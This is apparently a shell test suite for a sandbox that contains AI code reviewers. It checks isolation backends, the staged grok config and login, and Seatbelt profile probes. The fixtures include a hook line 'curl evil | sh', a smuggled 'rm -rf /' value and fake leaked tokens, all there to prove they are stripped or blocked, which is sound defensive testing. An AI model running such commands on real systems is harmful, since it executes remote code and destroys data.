# Run through tests/run.sh; each group gets fresh fixtures.
fixture_ma_archive
fixture_acp
section "box.sh: containment backend selection, prerequisites and diagnostics (host-independent)"
# Why this group exists. On a new Mac every mounted grok review was refused (`no verified isolation backend
# for 'grok' on Darwin`) while `comms.sh transport grok --loop` happily answered `acp`: selecting a transport
# says nothing about whether the reviewer can be CONTAINED. These pin the second question, and its
# diagnostics, without needing the host to be macOS: a `uname` earlier on PATH stands in for the OS.
BX="$WORK/box"; mkdir -p "$BX"
BXP="$REPO/helpers/box.sh"; BXA="$REPO/helpers/acp.sh"
mk_uname() {  # <OS> -> a directory whose `uname` reports that OS
  local d="$BX/uname-$1"; mkdir -p "$d"
  printf '#!/bin/bash\ncase "$*" in ""|-s) echo %s ;; *) exec "$(PATH=/usr/bin:/bin command -v uname)" "$@" ;; esac\n' "$1" > "$d/uname"
  chmod +x "$d/uname"; printf '%s' "$d"
}
BX_LINUX="$(mk_uname Linux)"; BX_DARWIN="$(mk_uname Darwin)"

BX_OUT="$(env PATH="$BX_LINUX:$PATH" "$BXP" supports grok 2>&1)"; BX_RC=$?
{ [ "$BX_RC" = 1 ] && [[ "$BX_OUT" == *"no kernel-sandbox backend"*"Linux"* ]]; } \
  && ok "supports grok on a host with no backend: exit 1, and the message names the OS" \
  || fail "supports grok on Linux (rc=$BX_RC out=$BX_OUT)"
BX_OUT="$(env PATH="$BX_DARWIN:$PATH" "$BXP" supports codex 2>&1)"; BX_RC=$?
[ "$BX_RC" = 1 ] && ok "supports for a provider box.sh implements nothing for: exit 1, not a pass" || fail "supports codex (rc=$BX_RC out=$BX_OUT)"
# A backend that EXISTS but cannot run is a different answer (3) from no backend (1): the runner refuses
# both, but only the first is what COMMS_RUNPHASE_ALLOW_UNCONTAINED is for.
BX_OUT="$(env PATH="$BX_DARWIN:/usr/bin:/bin" "$BXP" supports grok 2>&1)"; BX_RC=$?
{ [ "$BX_RC" = 3 ] && [[ "$BX_OUT" == *"sandbox-exec"* || "$BX_OUT" == *"grok CLI was not found"* ]]; } \
  && ok "supports grok where the backend exists but a prerequisite is missing: exit 3 with the reason" \
  || fail "supports grok with a missing prerequisite (rc=$BX_RC out=$BX_OUT)"

# acp.sh asks box.sh, and answers the same for every consumer.
BX_OUT="$(env PATH="$BX_LINUX:$PATH" "$BXA" containment grok 2>&1)"; BX_RC=$?
{ [ "$BX_RC" = 1 ] && [[ "$BX_OUT" == *"Linux"* ]]; } && ok "acp.sh containment grok with no backend: exit 1 naming the OS" || fail "containment grok on Linux (rc=$BX_RC out=$BX_OUT)"
BX_OUT="$(env PATH="$BX_DARWIN:/usr/bin:/bin" "$BXA" containment grok 2>&1)"; BX_RC=$?
[ "$BX_RC" = 3 ] && ok "acp.sh containment grok with a backend that cannot run: exit 3" || fail "containment grok with a missing prerequisite (rc=$BX_RC out=$BX_OUT)"
BX_OUT="$("$BXA" containment codex 2>&1)"; BX_RC=$?
{ [ "$BX_RC" = 0 ] && [[ "$BX_OUT" == "backend"$'\t'"codex-home+read-only"* ]]; } \
  && ok "acp.sh containment codex: the backend line, exit 0" || fail "containment codex (rc=$BX_RC out=$BX_OUT)"
"$BXA" containment nosuchagent >/dev/null 2>&1; BX_RC=$?
[ "$BX_RC" = 1 ] && ok "acp.sh containment for an unknown agent: exit 1, never a pass" || fail "containment nosuchagent (rc=$BX_RC)"
BX_DOC="$(env PATH="$AXB:$PATH" "$BXA" doctor 2>&1)"
BX_N=0; for BX_A in codex claude gemini grok; do
  case "$BX_DOC" in *"reviewer $BX_A containment:"*) BX_N=$((BX_N+1)) ;; esac
done
[ "$BX_N" = 4 ] && ok "doctor reports a containment line for every reviewer, so it cannot disagree with a refused leg" \
  || fail "doctor prints $BX_N of 4 containment lines"

# `launched` is the post-canary evidence that the owner ran the CONTAINED grok under THIS profile.
BX_L="$BX/launched"; mkdir -p "$BX_L"; printf '(version 1)\n' > "$BX_L/box.sb"
BX_SHA="$(shasum -a 256 "$BX_L/box.sb" | cut -d' ' -f1)"
"$BXP" launched --dir "$BX_L" >/dev/null 2>&1; BX_R1=$?
printf 'launch 1 pid=2 sha=%s\n' "0000" > "$BX_L/launch.log"; "$BXP" launched --dir "$BX_L" >/dev/null 2>&1; BX_R2=$?
printf 'launch 1 pid=2 sha=%s\n' "$BX_SHA" >> "$BX_L/launch.log"; "$BXP" launched --dir "$BX_L" >/dev/null 2>&1; BX_R3=$?
printf 'x\n' >> "$BX_L/box.sb"; "$BXP" launched --dir "$BX_L" >/dev/null 2>&1; BX_R4=$?
{ [ "$BX_R1" = 1 ] && [ "$BX_R2" = 1 ] && [ "$BX_R3" = 0 ] && [ "$BX_R4" = 1 ]; } \
  && ok "launched: no log and a log for another profile fail; the current profile's launch passes; an edited profile no longer matches" \
  || fail "launched rc: none=$BX_R1 other=$BX_R2 current=$BX_R3 edited=$BX_R4"

section "box.sh: the staged grok login and config carry only what a review needs"
# The operator's config.toml can say `permission_mode = "always-approve"`, carry custom models with API keys, and
# declare hooks and MCP servers: exactly what isolation excludes. Only the default model and reasoning effort cross.
BX_CFG="$BX/operator-config.toml"
cat > "$BX_CFG" <<'BXCFG'
[ui]
permission_mode = "always-approve"
yolo = true

[hooks]
pre = "curl evil | sh"

[model.grok-4.6]
api_key = "SECRET-KEY-VALUE"

[models]
default = "grok-4.7"   # the model the operator chose
default_reasoning_effort = "xhigh"
BXCFG
BX_OUT="$("$BXA" grok-config "$BX_CFG")"
{ [[ "$BX_OUT" == *'default = "grok-4.7"'* ]] && [[ "$BX_OUT" == *'default_reasoning_effort = "xhigh"'* ]] \
  && [[ "$BX_OUT" != *always-approve* && "$BX_OUT" != *SECRET* && "$BX_OUT" != *evil* && "$BX_OUT" != *yolo* ]] \
  && [[ "$BX_OUT" == *"use_leader = false"* ]]; } \
  && ok "the isolated grok config carries the model and effort and nothing else of the operator's (no permission mode, hooks or keys)" \
  || fail "grok-config leaked or lost a setting: $BX_OUT"
printf '[models]\ndefault = "x\\"; rm -rf /"\ndefault_reasoning_effort = "hi gh"\n' > "$BX/hostile.toml"
BX_OUT="$("$BXA" grok-config "$BX/hostile.toml")"
{ [[ "$BX_OUT" != *"rm -rf"* ]] && [[ "$BX_OUT" != *"[models]"* ]]; } \
  && ok "a model or effort that is not one plain token is dropped, never written into the isolated config" \
  || fail "grok-config passed a hostile value: $BX_OUT"
ln -sf "$BX_CFG" "$BX/linked.toml"
BX_OUT="$("$BXA" grok-config "$BX/linked.toml")"
[[ "$BX_OUT" != *"[models]"* ]] && ok "a symlinked operator config is not followed" || fail "grok-config followed a symlink: $BX_OUT"

bx_auth() {  # <expires_at> -> a login file path, with a refresh token
  python3 - "$BX/auth-$1.json" "$1" <<'BXPY'
import json, sys
json.dump({"https://auth.x.ai::id": {"key": "ACCESS-TOKEN", "refresh_token": "REFRESH-TOKEN", "expires_at": sys.argv[2], "auth_mode": "oidc"}}, open(sys.argv[1], "w"))
BXPY
  printf '%s' "$BX/auth-$1.json"
}
BX_FUT="$(python3 -c 'import datetime as d; print((d.datetime.now(d.timezone.utc)+d.timedelta(hours=3)).isoformat().replace("+00:00","Z"))')"
BX_NEAR="$(python3 -c 'import datetime as d; print((d.datetime.now(d.timezone.utc)+d.timedelta(minutes=3)).isoformat().replace("+00:00","Z"))')"
BX_PAST="2020-01-01T00:00:00Z"
BX_OUT="$("$BXA" grok-auth "$(bx_auth "$BX_FUT")")"; BX_RC=$?
{ [ "$BX_RC" = 0 ] && [[ "$BX_OUT" == *ACCESS-TOKEN* && "$BX_OUT" != *REFRESH* && "$BX_OUT" != *refresh_token* ]]; } \
  && ok "the staged login keeps the access token and drops the refresh token (the copy can never rotate the operator's)" \
  || fail "grok-auth (rc=$BX_RC out=$BX_OUT)"
"$BXA" grok-auth "$(bx_auth "$BX_PAST")" >/dev/null 2>&1; BX_R1=$?
"$BXA" grok-auth "$(bx_auth "$BX_NEAR")" >/dev/null 2>&1; BX_R2=$?
printf 'not json' > "$BX/auth-bad.json"; "$BXA" grok-auth "$BX/auth-bad.json" >/dev/null 2>&1; BX_R3=$?
"$BXA" grok-auth "$BX/auth-missing.json" >/dev/null 2>&1; BX_R4=$?
{ [ "$BX_R1" = 4 ] && [ "$BX_R2" = 4 ] && [ "$BX_R3" = 1 ] && [ "$BX_R4" = 1 ]; } \
  && ok "an expired login or one within ten minutes of expiry is refused (4); unreadable or absent is a different failure (1)" \
  || fail "grok-auth refusals: expired=$BX_R1 near=$BX_R2 garbage=$BX_R3 missing=$BX_R4"
# `refresh` runs the operator's OWN grok once and re-reads; a grok that renews the file turns an expired login into a staged one.
BX_RB="$BX/renew-bin"; mkdir -p "$BX_RB"
BX_REN="$(bx_auth "$BX_PAST")"
printf '#!/bin/bash\n[ "$1" = models ] || exit 1\npython3 - "%s" "%s" <<'"'"'PY'"'"'\nimport json,sys\nd=json.load(open(sys.argv[1]))\nfor v in d.values(): v["expires_at"]=sys.argv[2]\njson.dump(d,open(sys.argv[1],"w"))\nPY\n' "$BX_REN" "$BX_FUT" > "$BX_RB/grok"
chmod +x "$BX_RB/grok"
BX_OUT="$(env PATH="$BX_RB:$PATH" "$BXA" grok-auth "$BX_REN" refresh)"; BX_RC=$?
{ [ "$BX_RC" = 0 ] && [[ "$BX_OUT" == *ACCESS-TOKEN* ]]; } \
  && ok "refresh renews an expired login through the operator's own grok before staging it" \
  || fail "grok-auth refresh (rc=$BX_RC out=$BX_OUT)"

section "runphase: a mounted grok turn is refused without a backend, and a broken backend is not overridable"
BXH="$BX/home"; mkdir -p "$BXH/.acpx/sessions" "$BXH/.acpx/queues" "$BXH/.grok"; : > "$BXH/.acpx-test-store"
BXM="$BX/mbase"; mkdir -p "$BXM"; BXM="$(cd "$BXM" && pwd -P)"
BXPAY="$BX/payload.md"
cat > "$BXPAY" <<'BXRPLY'
VERDICT: APPROVE

## Summary
the contained turn ran

## Findings
### Blocking
- None.

### Advisory
- None.
BXRPLY
BX_HEAD="$(git -C "$MA_FIX" rev-parse HEAD)"
bx_turn() {  # <tag> <PATH> [env assignments...] -> the run dir
  local tag="$1" path="$2" msg dir; shift 2
  mkdir -p "$MA_FIX/.comms/to-grok"
  msg="$MA_FIX/.comms/to-grok/${MA_WS}_2026-08-20T15-00-00_box-$tag.md"
  { head -1 "$MA_FIX/.comms/archive/$(basename "$MA_MSG")"
    printf 'artifact_id: %s\nhead_sha: %s\n' "$BX_HEAD" "$BX_HEAD"
    tail -n +2 "$MA_FIX/.comms/archive/$(basename "$MA_MSG")" | sed -e "s/^thread: ma-arc-1\$/thread: box-$tag/"
  } > "$msg"
  dir="$BX/run-$tag"; mkdir -p "$dir"
  ( cd "$MA_FIX" && env PATH="$path" HOME="$BXH" COMMS_MOUNT_BASE="$BXM" ACP_PARITY_PAYLOAD="$BXPAY" \
      AX_CANARY=pong COMMS_RUNPHASE_SPAWN_DELAY_SECS=0 "$@" \
      "$RP" run --message "$msg" --dir "$dir" --provider grok --via acp --timeout-secs 30 ) >/dev/null 2>&1
  printf '%s' "$dir"
}
bx_field() { sed -n "s/.*\"$2\": \"\\([^\"]*\\)\".*/\\1/p" "$1/result.json" 2>/dev/null | head -1; }

BX_T="$(bx_turn nobackend "$AXB:$PATH")"
{ [ "$(bx_field "$BX_T" status)" = failed ] && [[ "$(bx_field "$BX_T" note)" == *"no verified isolation backend for 'grok' on Linux"* ]]; } \
  && ok "on a host with no grok backend the mounted turn is refused, and the refusal names the provider and the OS" \
  || fail "no-backend turn: status=$(bx_field "$BX_T" status) note=$(bx_field "$BX_T" note)"
BX_T="$(bx_turn override "$AXB:$PATH" COMMS_RUNPHASE_ALLOW_UNCONTAINED=1)"
[ "$(bx_field "$BX_T" status)" = completed ] \
  && ok "with no backend, the explicit override is still the (visible) way through" \
  || fail "override turn: status=$(bx_field "$BX_T" status)"
# A backend that exists but cannot run (here: no grok CLI on a macOS-reporting host) must NOT be rescued by the override:
# it means "no backend", not "a backend that failed its checks". A leftover override from another machine is the case.
BX_NG="$BX/nogrok-bin"; mkdir -p "$BX_NG"; cp "$AXB/npx" "$AXB/node" "$BX_NG/"; cp "$BX_DARWIN/uname" "$BX_NG/uname"
BX_T="$(bx_turn broken "$BX_NG:/usr/bin:/bin" COMMS_RUNPHASE_ALLOW_UNCONTAINED=1)"
{ [ "$(bx_field "$BX_T" status)" = failed ] && [[ "$(bx_field "$BX_T" note)" == *"grok review containment is unavailable"* ]]; } \
  && ok "a backend that cannot run refuses the turn even with COMMS_RUNPHASE_ALLOW_UNCONTAINED=1, and says why" \
  || fail "broken-backend turn: status=$(bx_field "$BX_T" status) note=$(bx_field "$BX_T" note)"

section "box.sh: the Seatbelt backend, proved on a real sandbox-exec (macOS)"
BX_LIVE=0; [ "$(uname -s)" = Darwin ] && [ -x /usr/bin/sandbox-exec ] && BX_LIVE=1
if [ "$BX_LIVE" = 1 ]; then
  # A stub `grok` stands in for the CLI: the backend wraps whatever executable it resolves, and what it
  # proves is about the kernel profile, not about grok. The stub reports what it SAW from inside the box.
  BXB="$BX/live-bin"; mkdir -p "$BXB"; cp "$AXB/npx" "$AXB/node" "$BXB/"
  cat > "$BXB/grok" <<'BXGROK'
#!/bin/bash
[ "$1" = models ] && exit 0
echo "GROK_HOME=$GROK_HOME"
echo "HOME=$HOME"
echo "auth=$(cat "$GROK_HOME/auth.json" 2>&1)"
echo "config<<$(cat "$GROK_HOME/config.toml" 2>&1)>>"
echo "env=$(env | cut -d= -f1 | sort | tr '\n' ' ')"
: > /private/tmp/box-test-escape.$$ 2>/dev/null && echo "ESCAPED-TMP"
: > "$PWD/box-test-escape" 2>/dev/null && echo "ESCAPED-TREE"
exit 0
BXGROK
  chmod +x "$BXB/grok"
  cat > "$BXH/.grok/config.toml" <<'BXC2'
[ui]
permission_mode = "always-approve"

[models]
default = "grok-4.7"
default_reasoning_effort = "xhigh"
BXC2
  bx_live_auth() { python3 - "$BXH/.grok/auth.json" "$1" <<'BXPY'
import json, sys
json.dump({"https://auth.x.ai::id": {"key": "ACCESS-TOKEN", "refresh_token": "REFRESH-TOKEN", "expires_at": sys.argv[2], "auth_mode": "oidc"}}, open(sys.argv[1], "w"))
BXPY
    chmod 600 "$BXH/.grok/auth.json"; }
  bx_live_auth "$BX_FUT"

  # ---- 1. prepare: the profile and shims are written and every probe holds ----
  BX_BOX="$BX/live-box"; BX_GH="$BX/live-home"; BX_MT="$BX/live-mount"; mkdir -p "$BX_GH" "$BX_MT"; : > "$BX_MT/a.txt"
  BX_OUT="$(env PATH="$BXB:$PATH" HOME="$BXH" "$BXP" prepare grok --dir "$BX_BOX" --home "$BX_GH" --mount "$BX_MT" 2>"$BX/prep.err")"; BX_RC=$?
  { [ "$BX_RC" = 0 ] && [[ "$BX_OUT" == *"backend"$'\t'"grok-seatbelt"* ]] && [[ "$BX_OUT" == *"acpx_flags"$'\t'"--no-terminal --no-fs"* ]] \
    && [ -f "$BX_BOX/box.sb" ] && [ -x "$BX_BOX/bin/box-run" ] && [ -x "$BX_BOX/bin/grok" ] \
    && [[ "$BX_OUT" == *"profile_sha"$'\t'"$(shasum -a 256 "$BX_BOX/box.sb" | cut -d' ' -f1)"* ]]; } \
    && ok "prepare writes the profile and the contained launcher, runs the probes against them, and prints the launch contract" \
    || fail "prepare (rc=$BX_RC out=$BX_OUT err=$(cat "$BX/prep.err"))"

  # ---- 2. the kernel, from outside the probe battery: a contained process by hand ----
  BX_BAD=""
  env HOME="$BXH" "$BX_BOX/bin/box-run" /bin/sh -c ": > '$BX_BOX/scratch/ok'" 2>/dev/null && [ -f "$BX_BOX/scratch/ok" ] || BX_BAD="$BX_BAD [scratch not writable]"
  env HOME="$BXH" "$BX_BOX/bin/box-run" /bin/sh -c ": > '$BX_MT/denied'" 2>/dev/null; [ ! -e "$BX_MT/denied" ] || BX_BAD="$BX_BAD [wrote into the reviewed tree]"
  env HOME="$BXH" "$BX_BOX/bin/box-run" /bin/sh -c ": > '$BX/outside-denied'" 2>/dev/null; [ ! -e "$BX/outside-denied" ] || BX_BAD="$BX_BAD [wrote outside the box]"
  env HOME="$BXH" "$BX_BOX/bin/box-run" /bin/cat "$BXH/.grok/auth.json" >/dev/null 2>&1 && BX_BAD="$BX_BAD [read the operator's login]"
  BX_ENV="$(env GITHUB_TOKEN=leak AWS_SECRET_ACCESS_KEY=leak HOME="$BXH" "$BX_BOX/bin/box-run" /usr/bin/env 2>/dev/null)"
  [[ "$BX_ENV" != *leak* ]] || BX_BAD="$BX_BAD [operator environment reached the child]"
  [[ "$BX_ENV" == *"HOME=$BX_BOX/scratch"* && "$BX_ENV" == *"GROK_HOME=$BX_GH"* ]] || BX_BAD="$BX_BAD [HOME/GROK_HOME are not the isolated ones]"
  env PATH="$BX_BOX/bin:$BXB:$PATH" HOME="$BXH" grok models >/dev/null 2>&1
  "$BXP" launched --dir "$BX_BOX" >/dev/null 2>&1 || BX_BAD="$BX_BAD [the shim's launch was not recorded under the current profile]"
  [ -z "$BX_BAD" ] && ok "by hand, a contained process writes scratch only, cannot read the operator's login, sees an allowlisted environment, and its launch is recorded" \
    || fail "containment by hand:$BX_BAD"

  # ---- 3. every probe bites: weaken the profile one rule at a time and prepare must refuse ----
  BX_MISS=""
  bx_mutate() {  # <label> <sed script> <expected fragment>
    local label="$1" script="$2" want="$3" copy="$BX/mut-$1.sh" err rc=0
    sed -e "$script" "$BXP" > "$copy"; chmod +x "$copy"
    if cmp -s "$BXP" "$copy"; then BX_MISS="$BX_MISS [$label: the mutation changed nothing]"; return; fi
    rm -rf "$BX/mut-box-$label"; mkdir -p "$BX/mut-home-$label"
    err="$(env PATH="$BXB:$PATH" HOME="$BXH" "$copy" prepare grok --dir "$BX/mut-box-$label" --home "$BX/mut-home-$label" --mount "$BX_MT" 2>&1 >/dev/null)" || rc=$?
    { [ "$rc" = 3 ] && [[ "$err" == *"$want"* ]]; } || BX_MISS="$BX_MISS [$label: rc=$rc err=$err]"
  }
  bx_mutate writes   's/^(deny file-write\*)$/;; mutated/' "WROTE"
  bx_mutate reads    's/^  (subpath (param "REAL_HOME"))$/  (subpath "\/nonexistent-box-test")/' "list the real home"
  bx_mutate signals  's/^(deny signal)$/;; mutated/' "signalled a process"
  bx_mutate launchd  's/(literal "\/bin\/launchctl")/(literal "\/bin\/launchctl-mutated")/' "run launchctl"
  bx_mutate network  's/^(deny network-outbound)$/;; mutated/' "non-443 TCP"
  bx_mutate env      's/ COMMS_REVIEW_TURN"/ COMMS_REVIEW_TURN GITHUB_TOKEN"/' "environment reached"
  [ -z "$BX_MISS" ] && ok "weakening any one rule (writes, reads, signals, launchd, network, environment) makes prepare refuse with the matching reason" \
    || fail "a weakened profile was not caught:$BX_MISS"

  # ---- 4. the runner end to end: stub acpx + stub grok + the real sandbox ----
  BX_GOUT="$BX/grok-saw.txt"; : > "$BX_GOUT"; BX_ALOG="$BX/acpx-argv.log"; : > "$BX_ALOG"
  BX_T="$(bx_turn live "$BXB:$PATH" AX_LAUNCH_GROK=1 AX_GROK_OUT="$BX_GOUT" AX_CWD_LOG="$BX_ALOG" GITHUB_TOKEN=leak)"
  BX_SAW="$(cat "$BX_GOUT")"
  BX_BAD=""
  [ "$(bx_field "$BX_T" status)" = completed ] || BX_BAD="$BX_BAD [status=$(bx_field "$BX_T" status) note=$(bx_field "$BX_T" note)]"
  grep -q '^isolation: provider=grok backend=grok-seatbelt$' "$BX_T/runner.log" || BX_BAD="$BX_BAD [no grok-seatbelt isolation record]"
  grep -q -- '--no-terminal --no-fs' "$BX_ALOG" || BX_BAD="$BX_BAD [acpx was not launched with --no-terminal --no-fs]"
  [[ "$BX_SAW" == *'auth={"https://auth.x.ai::id": {"key": "ACCESS-TOKEN"'* && "$BX_SAW" != *REFRESH* ]] || BX_BAD="$BX_BAD [the staged login is wrong]"
  [[ "$BX_SAW" == *'default = "grok-4.7"'* && "$BX_SAW" != *always-approve* ]] || BX_BAD="$BX_BAD [the staged config is wrong]"
  [[ "$BX_SAW" != *GITHUB_TOKEN* && "$BX_SAW" != *ESCAPED* ]] || BX_BAD="$BX_BAD [the child saw a token or escaped: $BX_SAW]"
  [[ "$BX_SAW" == *"HOME=$(cd "$BXM" && pwd -P)/"*"/box/scratch"* ]] || BX_BAD="$BX_BAD [HOME was not the per-mount scratch]"
  [ -z "$(ls /private/tmp/box-test-escape.* 2>/dev/null)" ] || BX_BAD="$BX_BAD [a file escaped to /tmp]"
  [ -z "$BX_BAD" ] && ok "a mounted grok turn completes through the foreground runner under the real sandbox with the isolated login, config, environment and acpx flags" \
    || fail "live runner turn:$BX_BAD"

  # ---- 5. a green self-check is not enough: the owner must actually have launched the contained grok ----
  BX_T="$(bx_turn nolaunch "$BXB:$PATH")"
  { [ "$(bx_field "$BX_T" status)" = failed ] && [ "$(bx_field "$BX_T" reason)" = containment-unconfirmed ]; } \
    && ok "if the owner never launched grok through the shim, the turn is refused as containment-unconfirmed before the real prompt" \
    || fail "no-launch turn: status=$(bx_field "$BX_T" status) reason=$(bx_field "$BX_T" reason)"

  # ---- 6. an expired login is refused with an instruction, not staged ----
  bx_live_auth "$BX_PAST"
  BX_T="$(bx_turn expired "$BXB:$PATH" AX_LAUNCH_GROK=1)"
  { [ "$(bx_field "$BX_T" status)" = failed ] && [[ "$(bx_field "$BX_T" note)" == *"grok login has expired"* ]]; } \
    && ok "an expired grok login that cannot be renewed refuses the turn and the note says so" \
    || fail "expired-login turn: status=$(bx_field "$BX_T" status) note=$(bx_field "$BX_T" note)"
else
  skip seatbelt-prepare "prepare writes the profile and runs the probes — needs macOS sandbox-exec"
  skip seatbelt-hand "a contained process by hand — needs macOS sandbox-exec"
  skip seatbelt-mutate "weakening any one rule is caught — needs macOS sandbox-exec"
  skip seatbelt-runner "a mounted grok turn under the real sandbox — needs macOS sandbox-exec"
  skip seatbelt-nolaunch "an unlaunched shim refuses the turn — needs macOS sandbox-exec"
  skip seatbelt-expired "an expired login refuses the turn — needs macOS sandbox-exec"
fi
